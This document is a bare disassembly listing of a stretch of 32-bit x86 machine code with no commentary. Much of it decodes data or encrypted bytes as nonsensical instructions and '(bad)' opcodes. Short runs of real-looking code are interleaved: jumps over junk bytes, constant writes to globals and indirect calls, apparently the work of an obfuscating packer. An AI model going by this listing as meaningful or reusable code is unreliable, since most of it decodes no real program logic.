  426cbe:	sub    esi,DWORD PTR [edi-0x42]
  426cc1:	out    0x4b,eax
  426cc3:	in     eax,dx
  426cc4:	outs   dx,DWORD PTR ds:[esi]
  426cc5:	ins    DWORD PTR es:[edi],dx
  426cc6:	mov    eax,ds:0x3678baf0
  426ccb:	jp     0x426d12
  426ccd:	ja     0x426d3d
  426ccf:	ins    BYTE PTR es:[edi],dx
  426cd0:	cmc    
  426cd1:	jecxz  0x426ca5
  426cd3:	xchg   ebx,eax
  426cd4:	cwde   
  426cd5:	jg     0x426d37
  426cd7:	fucom  st(7)
  426cd9:	neg    BYTE PTR [ebx+0x7e]
  426cdc:	outs   dx,DWORD PTR ds:[esi]
  426cdd:	sbb    al,0x67
  426cdf:	(bad)  
  426ce0:	cmc    
  426ce1:	mov    ds:0xc7615758,al
  426ce6:	inc    esp
  426ce7:	and    al,0x28
  426ce9:	push   edi
  426cea:	jbe    0x426cec
  426cec:	add    BYTE PTR [ecx+0x42f58c05],al
  426cf2:	add    BYTE PTR [eax-0x74ffffcb],cl
  426cf8:	inc    esp
  426cf9:	and    al,0x28
  426cfb:	and    DWORD PTR ds:0x42f65c,0x23a1
  426d05:	mov    ecx,DWORD PTR [esp+0x30]
  426d09:	cmp    DWORD PTR ds:0x42f544,0x0
  426d10:	ja     0x426e06
  426d16:	jmp    0x426e06
  426d1b:	push   0x5b1f
  426d20:	call   DWORD PTR ds:0x4387c8
  426d26:	jmp    0x426e06
  426d2b:	dec    eax
  426d2c:	cmp    cl,bl
  426d2e:	int3   
  426d2f:	stc    
  426d30:	in     eax,dx
  426d31:	pop    ebp
  426d32:	mov    esp,0xd1cadc9
  426d37:	int3   
  426d38:	clc    
  426d39:	xlat   BYTE PTR ds:[ebx]
  426d3a:	mov    ebx,0x1cae4
  426d3f:	ret    
  426d40:	add    BYTE PTR [eax],al
  426d42:	add    BYTE PTR [edi+edi*1-0x6853fd2b],ch
  426d49:	fisttp WORD PTR [ebp+0x6d]
  426d4c:	mov    dl,0x53
  426d4e:	mov    bl,0xad
  426d50:	sub    esi,DWORD PTR [ebp+0x735f170f]
  426d56:	lds    edi,FWORD PTR [ecx+eax*4-0xd]
  426d5a:	push   esi
  426d5b:	mov    bh,0xff
  426d5d:	dec    edx
  426d5e:	adc    eax,0xeaed46ed
  426d63:	cmp    DWORD PTR [ebp-0xc],ecx
  426d66:	imul   ecx,edx,0xe76a3e46
  426d6c:	sub    edx,0x1d
  426d6f:	js     0x426d72
  426d71:	xor    eax,0x549bd2a4
  426d76:	pop    edx
  426d77:	mov    edx,0x7dfc5bbb
  426d7c:	(bad)  [edi]
  426d7e:	daa    
  426d7f:	shr    DWORD PTR [edi+0x34b58a56],cl
  426d85:	shl    BYTE PTR [edi+0x30],cl
  426d88:	arpl   WORD PTR [ebp-0x16],di
  426d8b:	adc    al,bl
  426d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d8e:	and    ah,dl
  426d90:	and    edi,ebx
  426d92:	(bad)  
  426d93:	aaa    
  426d94:	lea    edx,[ecx+0x2917a810]
  426d9a:	inc    ecx
  426d9b:	iret   
  426d9c:	cld    
  426d9d:	lock xchg ebx,eax
  426d9f:	push   0xffffffa2
  426da1:	mov    bl,0xe1
  426da3:	push   ebp
  426da4:	(bad)  
  426da5:	stc    
  426da6:	push   esi
  426da7:	mov    bl,0xac
  426da9:	mov    ah,0x39
  426dab:	out    0x8,eax
  426dad:	clc    
  426dae:	(bad)  
  426db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426db1:	ret    
  426db2:	addr16 shl edi,cl
  426db5:	sub    eax,0xb62a2474
  426dba:	jp     0x426e2d
  426dbc:	out    0xe3,eax
  426dbe:	ins    DWORD PTR es:[edi],dx
  426dbf:	xchg   ebx,eax
  426dc0:	lods   al,BYTE PTR ds:[esi]
  426dc1:	scas   eax,DWORD PTR es:[edi]
  426dc2:	fdiv   st(5),st
  426dc4:	scas   eax,DWORD PTR es:[edi]
  426dc5:	mov    al,0x8
  426dc7:	das    
  426dc8:	xchg   ebp,eax
  426dc9:	xchg   BYTE PTR [ebp+edx*4-0x19b11707],cl
  426dd0:	out    0x36,eax
  426dd2:	(bad)  
  426dd3:	iret   
  426dd4:	mov    esi,0x10df3beb
  426dd9:	adc    BYTE PTR [ebp-0x7],ch
  426ddc:	fmul   DWORD PTR [eax-0xe6c898b]
  426de2:	cmp    al,0x53
  426de4:	in     al,dx
  426de5:	inc    edi
  426de6:	inc    edx
  426de7:	pop    esp
  426de8:	sbb    DWORD PTR [ecx+esi*2-0x65e478d9],ecx
  426def:	jno    0x426e19
  426df1:	repnz daa 
  426df3:	sub    DWORD PTR [eax+0x10bec11a],esp
  426df9:	in     eax,0x56
  426dfb:	jecxz  0x426e08
  426dfd:	inc    eax
  426dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426dff:	mov    dh,0x80
  426e01:	mov    edx,es
  426e03:	lock push ds
  426e05:	cwde   
  426e06:	or     eax,0x123f
  426e0b:	jmp    0x426eeb
  426e10:	fwait
  426e11:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  426e13:	(bad)  
  426e15:	(bad)  
  426e17:	fs push cs
  426e19:	aaa    
  426e1a:	xchg   BYTE PTR [ebx],dh
  426e1c:	iret   
  426e1d:	push   es
  426e1e:	scas   eax,DWORD PTR es:[edi]
  426e1f:	cmp    BYTE PTR [edi-0x3cfffe35],ah
  426e25:	add    BYTE PTR [eax],al
  426e27:	add    BYTE PTR [ebp-0x686dc9ad],dh
  426e2d:	std    
  426e2e:	lds    ebx,FWORD PTR [edx+0x7384a82c]
  426e34:	sbb    ebp,esp
  426e36:	inc    esp
  426e37:	sbb    al,0x3c
  426e39:	ds mov esi,0xce9b1727
  426e3f:	dec    edx
  426e40:	mov    edx,DWORD PTR [esi-0x1ea43873]
  426e46:	ret    
  426e47:	push   eax
  426e48:	lahf   
  426e49:	mov    edx,0x1fd717fb
  426e4e:	mov    BYTE PTR [edi-0x10fe9ed4],dh
  426e54:	adc    al,BYTE PTR [edx-0x29]
  426e57:	outs   dx,DWORD PTR ds:[esi]
  426e58:	jge    0x426e35
  426e5a:	mov    bh,0xbb
  426e5c:	or     cl,dh
  426e5e:	in     al,dx
  426e5f:	push   eax
  426e60:	int3   
  426e61:	mov    al,0x83
  426e63:	daa    
  426e64:	fbld   TBYTE PTR [ebp-0x1c930755]
  426e6a:	xchg   esp,eax
  426e6b:	mov    bh,bl
  426e6d:	pusha  
  426e6e:	jecxz  0x426ee4
  426e70:	in     eax,0x67
  426e72:	jns    0x426e3f
  426e74:	and    ebx,edi
  426e76:	jp     0x426ef7
  426e78:	xchg   ecx,eax
  426e79:	and    ch,BYTE PTR [edi-0x79be508c]
  426e7f:	add    bl,BYTE PTR [ecx+ecx*2-0x7]
  426e83:	lahf   
  426e84:	in     eax,0xf4
  426e86:	into   
  426e87:	pusha  
  426e88:	ins    DWORD PTR es:[edi],dx
  426e89:	inc    ebp
  426e8a:	in     eax,dx
  426e8b:	test   DWORD PTR [ebp-0x3f],0x77a875bf
  426e92:	adc    esp,DWORD PTR [ecx-0x11]
  426e95:	outs   dx,BYTE PTR ds:[esi]
  426e96:	cwde   
  426e97:	push   0xee6986cc
  426e9c:	push   0xffffff85
  426e9e:	cwde   
  426e9f:	inc    ebx
  426ea0:	add    ah,BYTE PTR [ebx-0x71]
  426ea3:	jae    0x426f02
  426ea5:	pop    ss
  426ea6:	mov    bh,0xb
  426ea8:	(bad)  [esi+ebx*8-0x3f4c2324]
  426eaf:	sub    DWORD PTR es:[edi-0x2416907a],ebp
  426eb6:	jae    0x426e3f
  426eb8:	mov    al,0xdb
  426eba:	xchg   esp,eax
  426ebb:	lea    eax,[edi+0xb9f4021]
  426ec1:	jmp    0x426e4c
  426ec3:	popf   
  426ec4:	enter  0x4f4c,0x67
  426ec8:	ja     0x426e50
  426eca:	xor    DWORD PTR [ecx],0x44fa53d8
  426ed0:	adc    BYTE PTR [edi-0x2b871876],ch
  426ed6:	(bad)  
  426ed7:	ss adc al,0xb3
  426eda:	imul   edx,DWORD PTR [edx-0xfd6c786],0xc921d3f
  426ee4:	sbb    BYTE PTR [ecx+0x6d283743],cl
  426eea:	cmp    al,0x33
  426eec:	ror    DWORD PTR [ebx+0xb3c244c],0xc1
  426ef3:	mov    ecx,DWORD PTR [esp+0x40]
  426ef7:	jmp    0x426fd7
  426efc:	outs   dx,BYTE PTR ds:[esi]
  426efd:	jae    0x426f0f
  426eff:	gs sbb eax,0x417b7f67
  426f05:	mov    ebp,0x26e65913
  426f0a:	dec    ecx
  426f0b:	fisubr WORD PTR [edx-0x34]
  426f0e:	add    DWORD PTR [eax],eax
  426f10:	ret    
  426f11:	add    BYTE PTR [eax],al
  426f13:	add    BYTE PTR [ebx-0x1a],dh
  426f16:	mov    ecx,DWORD PTR [eax+0x390fe440]
  426f1c:	pop    eax
  426f1d:	ds mov dl,0x81
  426f20:	fild   WORD PTR [esi+eiz*2-0x28be363]
  426f27:	loop   0x426f29
  426f29:	sub    BYTE PTR [ebx-0x6d],0xda
  426f2d:	or     DWORD PTR [ecx+0x1c03967e],ecx
  426f33:	adc    ebx,DWORD PTR [edi]
  426f35:	xchg   DWORD PTR [bp+si+0x5d],ecx
  426f39:	jg     0x426f69
  426f3b:	and    bh,BYTE PTR [ebp-0x22]
  426f3e:	mov    ch,0x45
  426f40:	push   0xcb45ac16
  426f45:	je     0x426f7d
  426f47:	push   edi
  426f48:	xchg   DWORD PTR [ebx-0x67957d9b],edi
  426f4e:	lods   eax,DWORD PTR ds:[esi]
  426f4f:	(bad)  
  426f51:	in     al,0xdb
  426f53:	bound  edx,QWORD PTR [edx]
  426f55:	cmc    
  426f56:	cmp    al,0x9d
  426f58:	sar    DWORD PTR [ebp-0x9],cl
  426f5b:	and    DWORD PTR [edi+ecx*1-0x63],edi
  426f5f:	cmp    dl,BYTE PTR [ebx-0x127b1e34]
  426f65:	lock in al,dx
  426f67:	cmp    BYTE PTR [ebp+0x5e87abd1],bl
  426f6d:	fucomp st(5)
  426f6f:	push   ecx
  426f70:	sbb    al,0x67
  426f72:	ret    0xef8f
  426f75:	or     BYTE PTR [ebx],bl
  426f77:	xor    DWORD PTR [edx],edx
  426f79:	sar    esi,1
  426f7b:	in     al,0xd0
  426f7d:	push   edi
  426f7e:	sbb    BYTE PTR [ecx+0x52b7bc4f],0xaa
  426f85:	popf   
  426f86:	sti    
  426f87:	loope  0x426ffc
  426f89:	push   0xe1d23219
  426f8e:	adc    BYTE PTR [ecx-0x6d],0xf7
  426f92:	sub    ch,dl
  426f94:	scas   al,BYTE PTR es:[edi]
  426f95:	pushf  
  426f96:	mov    edx,0xedcba36
  426f9b:	sub    eax,0x1a446224
  426fa0:	(bad)  
  426fa1:	pop    esp
  426fa2:	xor    DWORD PTR [ecx-0x4e],ebp
  426fa5:	lods   al,BYTE PTR ds:[esi]
  426fa6:	mov    al,ds:0x11c523e3
  426fab:	cld    
  426fac:	shr    DWORD PTR [edi],0x15
  426faf:	ins    DWORD PTR es:[edi],dx
  426fb0:	stc    
  426fb1:	(bad)  
  426fb2:	jb     0x426fbe
  426fb4:	push   esp
  426fb5:	cmc    
  426fb6:	jb     0x426f8f
  426fb8:	add    DWORD PTR [ebx+0x140b7a9e],edi
  426fbe:	jg     0x42701e
  426fc0:	out    dx,eax
  426fc1:	dec    edx
  426fc2:	mov    ah,0x1e
  426fc4:	rcr    DWORD PTR [ebx],0x99
  426fc7:	stc    
  426fc8:	aad    0x4f
  426fca:	sub    ah,BYTE PTR [ecx+0x7e]
  426fcd:	addr16 pop ebp
  426fcf:	shl    DWORD PTR [esi+0x1146204f],0xf1
  426fd6:	xchg   ecx,eax
  426fd7:	xor    edx,edx
  426fd9:	div    ecx
  426fdb:	mov    DWORD PTR ds:0x42f624,0x20df
  426fe5:	mov    ecx,DWORD PTR [esp+0x18]
  426fe9:	mov    esi,0x8dacd260
  426fee:	mov    edi,0x66479db3
  426ff3:	mov    DWORD PTR ds:0x42f5f0,0x145d
  426ffd:	cmp    eax,ecx
  426fff:	mov    DWORD PTR ds:0x42f640,0xe8b
  427009:	ja     0x42761f
  42700f:	mov    eax,0x5550
  427014:	mov    eax,ds:0x42f3dc
  427019:	jmp    0x4270f9
  42701e:	or     ah,al
  427020:	scas   al,BYTE PTR es:[edi]
  427021:	push   0xe2ce6eee
  427026:	mov    cl,dh
  427028:	and    BYTE PTR [edx],al
  42702a:	fbstp  TBYTE PTR [edi-0x32d28fb1]
  427030:	add    DWORD PTR [eax],eax
  427032:	ret    
  427033:	add    BYTE PTR [eax],al
  427035:	add    bl,cl
  427037:	mov    bh,0x16
  427039:	xor    bh,BYTE PTR [ebx]
  42703b:	xchg   esi,eax
  42703c:	jae    0x426ff9
  42703e:	out    0xbd,al
  427040:	fistp  WORD PTR [esi]
  427042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427043:	mov    bh,0x85
  427045:	add    BYTE PTR [edi+0xe95ac97],bh
  42704b:	push   0xffffffcf
  42704d:	xchg   edi,eax
  42704e:	mov    cl,0x8c
  427050:	or     eax,0x9871de55
  427055:	xchg   DWORD PTR [eax-0x7d],ebx
  427058:	mov    bl,0xec
  42705a:	bnd jns 0x427051
  42705d:	lock fstp TBYTE PTR [edi]
  427060:	sahf   
  427061:	jne    0x42708a
  427063:	outs   dx,BYTE PTR ds:[esi]
  427064:	dec    edx
  427065:	scas   al,BYTE PTR es:[edi]
  427066:	dec    esp
  427067:	fdiv   DWORD PTR [esi+0x39da7d08]
  42706d:	fnstcw WORD PTR [eax-0x5ef4d7f5]
  427073:	bound  esi,QWORD PTR [eax+ebx*8-0x730d0bbc]
  42707a:	es aas 
  42707c:	jbe    0x427047
  42707e:	mov    DWORD PTR [eax+0x2fe10a3],esp
  427084:	shl    DWORD PTR [esi-0x64c6cb39],1
  42708a:	pop    esi
  42708b:	xor    ch,BYTE PTR [ebx-0x63]
  42708e:	retf   
  42708f:	pop    esi
  427090:	(bad)  
  427091:	jo     0x4270e7
  427093:	or     BYTE PTR [ecx],bl
  427095:	sar    DWORD PTR [ebx],0x33
  427098:	adc    al,BYTE PTR [esi+0x71]
  42709b:	(bad)  
  42709c:	push   edx
  42709d:	mov    ch,0x75
  42709f:	mov    ecx,eax
  4270a1:	aas    
  4270a2:	xor    dh,BYTE PTR [edi]
  4270a4:	pop    ss
  4270a5:	sbb    cl,ch
  4270a7:	cmp    eax,0x5073a52d
  4270ac:	outs   dx,BYTE PTR ds:[esi]
  4270ad:	dec    ebx
  4270ae:	mov    ebp,DWORD PTR [edi]
  4270b0:	adc    esi,DWORD PTR [ecx]
  4270b2:	pop    eax
  4270b3:	pop    ss
  4270b4:	jbe    0x427044
  4270b6:	push   esp
  4270b7:	ret    0xeaea
  4270ba:	push   ecx
  4270bb:	pop    es
  4270bc:	sti    
  4270bd:	test   al,0x3a
  4270bf:	std    
  4270c0:	xor    DWORD PTR fs:[eax+edi*8-0x1fc1dbb3],0x1cb311b8
  4270cc:	dec    ebx
  4270cd:	sub    eax,0x5101e91e
  4270d2:	ficom  DWORD PTR [edx+esi*1]
  4270d5:	ret    
  4270d6:	fnstcw WORD PTR ss:[esp+eax*4-0x50]
  4270db:	lea    edx,[edx+0x30]
  4270de:	xor    cl,BYTE PTR [edi-0x312b83ae]
  4270e4:	fdivr  DWORD PTR [ebp-0x62]
  4270e7:	shl    dh,0x81
  4270ea:	push   esp
  4270eb:	inc    dh
  4270ed:	neg    al
  4270ef:	inc    eax
  4270f0:	jo     0x4270c6
  4270f2:	cs cld 
  4270f4:	xor    bh,BYTE PTR [ebp+0x30]
  4270f7:	ins    DWORD PTR es:[edi],dx
  4270f8:	jbe    0x427137
  4270fa:	ffreep st(0)
  4270fc:	mov    al,ds:0x1405c751
  427101:	test   BYTE PTR [edx+0x0],0xcd
  427105:	aaa    
  427106:	add    BYTE PTR [eax],al
  427108:	jne    0x42761f
  42710e:	mov    eax,DWORD PTR [esp+0x10]
  427112:	mov    ecx,DWORD PTR [esp+0x14]
  427116:	cmp    DWORD PTR ds:0x42f538,0x0
  42711d:	jbe    0x427142
  427123:	and    DWORD PTR ds:0x42f5b0,0x7059
  42712d:	add    DWORD PTR ds:0x42f55c,0x17f5
  427137:	jmp    0x427142
  42713c:	call   DWORD PTR ds:0x4387d0
  427142:	mov    ecx,DWORD PTR ds:0x42f1b4
  427148:	mov    ecx,DWORD PTR [ecx+0x198]
  42714e:	jmp    0x42722e
  427153:	repnz imul ebx,DWORD PTR [edi],0xf3fe9fec
  42715a:	jg     0x4271c7
  42715c:	sub    eax,0x53d55f24
  427161:	push   ecx
  427162:	dec    esi
  427163:	lock int 0x1
  427166:	add    bl,al
  427168:	add    BYTE PTR [eax],al
  42716a:	add    BYTE PTR [edi+eax*2+0x46adfe4c],dl
  427171:	js     0x42711d
  427173:	sub    BYTE PTR [esi+0x9],al
  427176:	sti    
  427177:	retf   
  427178:	adc    eax,0x31932d8d
  42717d:	and    edi,ecx
  42717f:	mov    di,0x3700
  427183:	jns    0x4271e0
  427185:	sbb    BYTE PTR [ebx+0x45],bh
  427188:	push   edi
  427189:	inc    ebx
  42718a:	sub    edx,ebp
  42718c:	push   esp
  42718d:	xchg   esi,eax
  42718e:	sbb    al,0x97
  427190:	xor    eax,0x338edd3a
  427195:	or     DWORD PTR [ebp+0x5],esi
  427198:	fmul   QWORD PTR [ebp-0x6]
  42719b:	cmp    eax,0xbf6562a9
  4271a0:	in     eax,0x8d
  4271a2:	jg     0x427183
  4271a4:	out    dx,eax
  4271a5:	ret    
  4271a6:	or     bh,BYTE PTR [ebx+0xc02eb9d]
  4271ac:	push   esp
  4271ad:	and    BYTE PTR [ebx+edx*8],0xc6
  4271b1:	lock in al,dx
  4271b3:	pop    eax
  4271b4:	jnp    0x427165
  4271b6:	aam    0x57
  4271b8:	cs dec ecx
  4271ba:	dec    ecx
  4271bb:	dec    eax
  4271bc:	loope  0x4271a2
  4271be:	and    BYTE PTR [esi+0x7f],al
  4271c1:	adc    esp,DWORD PTR [ecx-0x75]
  4271c4:	push   esp
  4271c5:	xor    esp,ebp
  4271c7:	push   es
  4271c8:	mov    DWORD PTR [esp+ecx*1],ebx
  4271cb:	jg     0x427177
  4271cd:	mov    eax,ds:0x7cbed304
  4271d2:	(bad)
  4271d6:	dec    eax
  4271d7:	leave  
  4271d8:	inc    esi
  4271d9:	cwde   
  4271da:	out    dx,eax
  4271db:	stos   BYTE PTR es:[edi],al
  4271dc:	std    
  4271dd:	out    0x3a,al
  4271df:	shr    BYTE PTR [edx+eiz*4-0x38],0x6c
  4271e4:	push   ds
  4271e5:	inc    ebp
  4271e6:	clc    
  4271e7:	mov    bh,0xcd
  4271e9:	or     DWORD PTR ds:0xa27b03be,0x417a3b57
  4271f3:	mov    ebp,0x133df34b
  4271f8:	sbb    DWORD PTR [ebx-0x60],edi
  4271fb:	push   ds
  4271fc:	sub    eax,DWORD PTR [esi]
  4271fe:	dec    esi
  4271ff:	dec    ecx
  427200:	in     al,dx
  427201:	sub    ch,BYTE PTR [esi]
  427203:	pop    esp
  427204:	fiadd  DWORD PTR [edi-0x6da43905]
  42720a:	int    0xbc
  42720c:	ret    0x2705
  42720f:	shl    DWORD PTR [ecx+ecx*4+0x6f223504],1
  427216:	je     0x427292
  427218:	push   cs
  427219:	mov    ebx,0xef400361
  42721e:	push   ss
  42721f:	aam    0xdd
  427221:	sbb    DWORD PTR fs:[ebp+0x4b8e0f52],edi
  427228:	rol    BYTE PTR [ebp-0x5c],1
  42722b:	adc    DWORD PTR [edx],0xffffffdf
  42722e:	xor    eax,esi
  427230:	sub    eax,edi
  427232:	jmp    0x427312
  427237:	clc    
  427238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427239:	cmp    eax,0xfaff7def
  42723e:	mov    bh,0x31
  427240:	dec    edi
  427241:	iret   
  427242:	jo     0x427254
  427244:	push   cs
  427245:	mov    esi,0x1ceb3c3
  42724a:	add    bl,al
  42724c:	add    BYTE PTR [eax],al
  42724e:	add    BYTE PTR [eax+ecx*1+0x23122051],ah
  427255:	and    DWORD PTR [eax+0x45d91c67],eax
  42725b:	scas   eax,DWORD PTR es:[edi]
  42725c:	(bad)  
  42725d:	pop    ecx
  42725e:	test   eax,0x77b44bfb
  427263:	add    BYTE PTR [ebp+ebp*1+0x1b],dl
  427267:	pop    esp
  427268:	aas    
  427269:	in     eax,dx
  42726a:	inc    DWORD PTR [edx-0x3a]
  42726d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42726e:	gs jns 0x427263
  427271:	xor    edi,DWORD PTR [ebp-0x442e21e8]
  427277:	mov    bh,0xf9
  427279:	lods   al,BYTE PTR ds:[esi]
  42727a:	push   ds
  42727b:	adc    al,BYTE PTR [eax+ebx*8]
  42727e:	aaa    
  42727f:	push   cs
  427280:	or     esi,DWORD PTR [edx]
  427282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427283:	loopne 0x4272d1
  427285:	dec    ebp
  427286:	cdq    
  427287:	test   eax,0x8a668d46
  42728c:	test   ecx,edx
  42728e:	stos   BYTE PTR es:[edi],al
  42728f:	ret    0xc83b
  427292:	pop    esp
  427293:	mov    edx,0xe0b87c43
  427298:	adc    dl,al
  42729a:	mov    ebp,0xd27ffd29
  42729f:	sbb    BYTE PTR [edi-0x331390e9],ch
  4272a5:	std    
  4272a6:	dec    ebp
  4272a7:	pop    ebp
  4272a8:	and    eax,0x96e8a3ca
  4272ad:	les    edx,FWORD PTR [eax-0x27cb9e93]
  4272b3:	or     BYTE PTR [ecx],dl
  4272b5:	mov    ds:0x42951075,al
  4272ba:	cmp    esp,esp
  4272bc:	lea    ecx,[edi]
  4272be:	int3   
  4272bf:	mov    edi,0x2e85522b
  4272c4:	nop    ebx
  4272c7:	(bad)  
  4272c8:	mov    ch,0x98
  4272ca:	scas   eax,DWORD PTR es:[edi]
  4272cb:	inc    esp
  4272cc:	cmp    DWORD PTR [esi+0x289e2a5f],ebp
  4272d2:	jmp    0x4e64aa00
  4272d7:	cmp    eax,0x46a596b1
  4272dc:	sbb    edx,DWORD PTR [edx+0x75]
  4272df:	int3   
  4272e0:	dec    edi
  4272e1:	loope  0x427300
  4272e3:	xor    eax,0x154f5b11
  4272e8:	fwait
  4272e9:	pop    ebp
  4272ea:	imul   esp,ebx,0x3b127083
  4272f0:	outs   dx,DWORD PTR ds:[esi]
  4272f1:	jo     0x42733b
  4272f3:	cmp    BYTE PTR [esi+eax*2-0x42],bh
  4272f7:	mov    eax,0xa390c18c
  4272fc:	xchg   ecx,eax
  4272fd:	imul   DWORD PTR [edx+0x6c]
  427300:	jns    0x4272da
  427302:	or     al,0x81
  427304:	xor    esi,DWORD PTR [ecx+0x47f0b481]
  42730a:	fadd   DWORD PTR [ecx]
  42730c:	fnsave [eax-0x12]
  42730f:	cli    
  427310:	mov    ecx,0x1901897a
  427315:	sbb    eax,0x42f538
  42731a:	mov    eax,DWORD PTR [esp+0x10]
  42731e:	or     ecx,DWORD PTR ds:0x42f5d8
  427324:	jmp    0x427404
  427329:	cmp    eax,0xdfe69f75
  42732e:	out    dx,al
  42732f:	jge    0x427330
  427331:	inc    edi
  427332:	js     0x42733d
  427334:	xchg   edx,eax
  427335:	mov    ah,ah
  427337:	jecxz  0x4273a2
  427339:	jbe    0x42730a
  42733b:	add    DWORD PTR [eax],eax
  42733d:	ret    
  42733e:	add    BYTE PTR [eax],al
  427340:	add    BYTE PTR [ecx],ch
  427342:	pop    edx
  427343:	hlt    
  427344:	fild   WORD PTR [edx-0x66]
  427347:	test   eax,0x2d63d25e
  42734c:	fadd   QWORD PTR ds:0x171ee1b2
  427352:	mov    fs,edx
  427354:	xor    DWORD PTR [ebp+eiz*4+0x5a],edi
  427358:	inc    esp
  427359:	adc    eax,esp
  42735b:	sar    BYTE PTR [ebx+edi*4],cl
  42735e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42735f:	dec    edx
  427360:	jmp    0x26269a45
  427365:	add    dl,BYTE PTR [ebp+0x5ced1241]
  42736b:	mov    eax,ds:0xc4168557
  427370:	(bad)  
  427371:	mov    cl,0x1d
  427373:	or     DWORD PTR [ecx],eax
  427375:	iret   
  427376:	or     eax,0xfe1938ff
  42737b:	push   eax
  42737c:	and    eax,esi
  42737e:	add    DWORD PTR [eax+0x65],edx
  427381:	rcl    BYTE PTR [eax+0x4e],cl
  427384:	jmp    0x427378
  427386:	push   eax
  427387:	icebp  
  427388:	fdivp  st(4),st
  42738a:	mov    bh,0x4d
  42738c:	leave  
  42738d:	ret    
  42738e:	fwait
  42738f:	inc    ebp
  427390:	dec    ebp
  427391:	retf   0x7d26
  427394:	fcmovb st,st(7)
  427396:	sub    al,0x45
  427398:	jns    0x42739a
  42739a:	or     eax,0x39ecb782
  42739f:	push   eax
  4273a0:	xchg   esi,eax
  4273a1:	cmp    ch,BYTE PTR [esi-0x678d8014]
  4273a7:	mov    BYTE PTR [edx],cl
  4273a9:	mov    bh,0x8d
  4273ab:	fdivrp st(7),st
  4273ad:	or     al,BYTE PTR [edx]
  4273af:	xchg   edx,eax
  4273b0:	test   DWORD PTR [esi+ecx*4-0x2cbda6c],eax
  4273b7:	cld    
  4273b8:	cmp    al,0x35
  4273ba:	sub    eax,0x33b57be8
  4273bf:	jb     0x4273ab
  4273c1:	(bad)  
  4273c2:	es enter 0x8102,0x5f
  4273c7:	fst    st(0)
  4273c9:	iret   
  4273ca:	icebp  
  4273cb:	shr    BYTE PTR [eax],0x26
  4273ce:	div    DWORD PTR [ebx-0x4]
  4273d1:	cmp    eax,0x96d3e20c
  4273d6:	out    0x4e,eax
  4273d8:	and    al,0x72
  4273da:	mov    dh,al
  4273dc:	fnstsw WORD PTR [edi-0x13]
  4273df:	push   0x56
  4273e1:	mov    cl,BYTE PTR [esi+0x32]
  4273e4:	es clc 
  4273e6:	or     DWORD PTR [eax-0x10718218],eax
  4273ec:	lods   eax,DWORD PTR ds:[esi]
  4273ed:	dec    esp
  4273ee:	mov    ebp,0x7948a948
  4273f3:	mov    WORD PTR [ebp+esi*2-0x11],?
  4273f7:	adc    al,0x7b
  4273f9:	mov    BYTE PTR [ecx],bh
  4273fb:	xor    ecx,DWORD PTR [edx-0x3b]
  4273fe:	push   es
  4273ff:	hlt    
  427400:	gs cmc 
  427402:	cmp    DWORD PTR [ebp+0x14244c8b],ebp
  427408:	xor    DWORD PTR ds:0x42f530,edi
  42740e:	xor    eax,esi
  427410:	cmp    DWORD PTR ds:0x42f548,0x0
  427417:	jle    0x427441
  42741d:	or     ecx,DWORD PTR ds:0x42f5b0
  427423:	jmp    0x427441
  427428:	push   0x6a8d
  42742d:	push   0x8a8e
  427432:	push   DWORD PTR [ebp-0x24]
  427435:	push   DWORD PTR [ebp-0x1c]
  427438:	push   DWORD PTR [ebp-0x28]
  42743b:	call   DWORD PTR ds:0x4387d4
  427441:	sub    eax,edi
  427443:	jmp    0x427523
  427448:	lods   eax,DWORD PTR ds:[esi]
  427449:	cs in  eax,0xc5
  42744c:	out    0xcf,eax
  42744e:	lods   eax,DWORD PTR ds:[esi]
  42744f:	outs   dx,BYTE PTR ds:[esi]
  427450:	inc    ecx
  427451:	sub    BYTE PTR [edx+eax*1-0x19],bl
  427455:	inc    dl
  427457:	(bad)  
  427459:	rol    BYTE PTR [ecx],1
  42745b:	add    bl,al
  42745d:	add    BYTE PTR [eax],al
  42745f:	add    bh,bh
  427461:	adc    esi,DWORD PTR [edi]
  427463:	inc    esp
  427464:	pop    ebx
  427465:	jmp    0x427470
  427467:	fcom   QWORD PTR [ebp+0x60a29433]
  42746d:	dec    eax
  42746e:	inc    ebp
  42746f:	inc    edx
  427470:	aam    0x4f
  427472:	and    al,0x61
  427474:	and    eax,0x896448f5
  427479:	xor    al,0x74
  42747b:	sbb    dl,BYTE PTR [edx+0x624c8975]
  427481:	test   al,0xe7
  427483:	(bad)  
  427484:	dec    esi
  427485:	mov    ebx,0xf4a38142
  42748a:	stc    
  42748b:	xor    eax,0x52b46fb9
  427490:	dec    edx
  427491:	jecxz  0x4274b1
  427493:	add    eax,0x8f7ec046
  427498:	daa    
  427499:	std    
  42749a:	add    BYTE PTR [esi],al
  42749c:	xchg   BYTE PTR [eax-0x4d],ah
  42749f:	lds    ebp,FWORD PTR [ebp+0x76]
  4274a2:	js     0x42742c
  4274a4:	enter  0x2c3d,0x3e
  4274a8:	add    BYTE PTR [esi+ecx*2],dh
  4274ab:	(bad)  
  4274ac:	mov    cl,0xa5
  4274ae:	or     al,0xf9
  4274b0:	and    BYTE PTR [esp+edi*4],ch
  4274b3:	sub    al,0xda
  4274b5:	fist   WORD PTR [ebp-0x154db797]
  4274bb:	int3   
  4274bc:	iret   
  4274bd:	hlt    
  4274be:	xor    bh,ch
  4274c0:	xchg   esi,eax
  4274c1:	xchg   ecx,edi
  4274c3:	cmp    BYTE PTR [eax-0x1],ah
  4274c6:	adc    edx,DWORD PTR [edx-0x20]
  4274c9:	lea    eax,[ebx+edi*4]
  4274cc:	sub    DWORD PTR [esi*8+0x62692ea],0xffffffb1
  4274d4:	adc    DWORD PTR [esi-0x3c3afcb2],eax
  4274da:	std    
  4274db:	sub    bh,BYTE PTR [ebx]
  4274dd:	xor    edi,esi
  4274df:	sub    al,0x65
  4274e1:	shr    edi,1
  4274e3:	js     0x42746a
  4274e5:	leave  
  4274e6:	xchg   esi,eax
  4274e7:	add    edx,DWORD PTR [ecx+0x226487e6]
  4274ed:	scas   eax,DWORD PTR es:[edi]
  4274ee:	jb     0x4274bd
  4274f0:	mov    ebx,0x991dc503
